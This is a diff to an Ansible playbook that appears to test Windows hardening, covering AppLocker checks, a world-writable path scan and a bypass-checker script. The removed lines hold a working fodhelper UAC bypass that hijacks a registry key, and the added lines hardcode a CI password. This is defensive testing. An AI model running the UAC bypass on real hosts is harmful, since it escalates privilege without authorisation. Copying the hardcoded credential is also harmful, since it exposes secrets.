@@ -2,11 +2,32 @@
 
 - name: Testing | AppLocker via powershell Get-AppLockerPolicy
   win_shell: "Get-AppLockerPolicy -Effective | Test-AppLockerPolicy -Path {{ item }}"
-  with_items: "{{ harden_win_testing_applocker_filepath }}"
+  with_items: "{{ harden_win_testing_applocker_filepath | default([]) }}"
 
+
+- name: Check directories permissions for world-writeable paths
+  win_shell: "C:\\ProgramData\\chocolatey\\lib\\sysinternals\\tools\\accesschk.exe -w Users \"{{ item }}\""
+  with_items:
+    - "C:\\Users"
+    - "C:\\Program Files"
+    - "C:\\Program Files (x86)"
+    - "C:\\ProgramData"
+    - "C:\\Windows"
+    - "C:\\PerfLogs"
+    - "C:\\opscode"
+    - "C:\\tmp"
+    - "{{ harden_win_temp_dir }}"
+  register: wpath_results
+- debug: var=wpath_results
+
+- set_fact:
+    ansible_become_password: "_Password_CI_CD_to_be_revoked1_"
+
+## FIXME! failing on second pass, https://groups.google.com/forum/#!topic/ansible-project/_ydkYXZibrM
 - name: Ensure user _test is present
   win_user:
     name: _test
+    password: "{{ ansible_become_password }}"
     state: present
     groups:
       - Users
@@ -15,9 +36,11 @@
 - name: upload test script
   win_template:
     src: AppLockerBypassChecker-v1.ps1
-    dest: "{{ harden_win_temp }}\\AppLockerBypassChecker-v1.ps1"
+    dest: "{{ harden_win_temp_dir }}\\AppLockerBypassChecker-v1.ps1"
+
+## FIXME! ProgramData dir is user writeable! opscode\inspec
 - name: AppLockerBypassChecker-v1 for user?
-  win_shell: "Powershell -Exec Bypass -File {{ harden_win_temp }}\\AppLockerBypassChecker-v1.ps1 {{ item }}"
+  win_shell: "Powershell -Exec Bypass -File {{ harden_win_temp_dir }}\\AppLockerBypassChecker-v1.ps1 \"{{ item }}\""
   become: yes
   become_user: _test
   with_items:
@@ -29,17 +52,13 @@
   register: bypass_results
 - debug: var=bypass_results
 
-## https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/
-## only valid for admin users
-- name: Test UAC bypass
-  win_regedit:
-    path: HKCU::\Software\Classes\ms-settings\Shell\Open\command
-    name: "{{ item.n }}"
-    data: "{{ item.d }}"
-    type: string
-  with_items:
-    - { n: DelegateExecute, d: '' }
-    - { n: '(default)', d: 'cmd /c start powershell.exe' }
-
-- name: Test UAC bypass - launch fodhelper
-  win_command: "C:\\Windows\\System32\\fodhelper.exe"
+#- name: Check log for blocked apps
+#  win_shell: Get-WinEvent -LogName 'Microsoft-Windows-AppLocker/EXE and DLL' | Where { $_.ID -eq 8004 }
+#  register: winevt
+#- debug: var=winevt.stdout_lines
+#
+### FIXME! often fails with 'ERROR! A worker was found in a dead state'
+#- name: Remove user _test
+#  win_user:
+#    name: _test
+#    state: absent
